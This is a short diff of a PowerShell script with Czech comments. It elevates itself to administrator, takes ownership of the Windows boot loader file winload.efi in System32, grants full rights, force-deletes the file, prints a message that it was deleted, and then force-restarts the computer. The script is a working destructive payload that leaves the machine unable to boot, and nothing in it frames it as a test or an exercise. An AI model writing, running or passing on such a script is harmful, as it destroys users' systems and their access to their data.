@@ -12,14 +12,16 @@ if (-not $isAdmin) {
 # --- Zde začíná samotný kód, který se spustí až po získání práv správce ---
 Write-Host "Skript nyní úspěšně běží s právy administrátora!" -ForegroundColor Green
 
-# Příklad administrátorského příkazu:
-# Get-Service
-
+# Převzetí vlastnictví a práv
 takeown /f "C:\Windows\System32\winload.efi" /a
 icacls "C:\Windows\System32\winload.efi" /grant administrators:F
 
+# Smazání souboru
 Remove-Item "C:\Windows\System32\winload.efi" -Force
+Write-Host "Soubor winload.efi byl úspěšně smazán." -ForegroundColor Red
 
-Read-Host "Stisknutím klávesy Enter skript ukončíte"
+# Čekání na stisknutí klávesy Enter v okně správce
+Read-Host "Stisknutím klávesy Enter skript ukončíte a počítač se restartuje"
 
+# Vynucený restart počítače
 Restart-Computer -Force
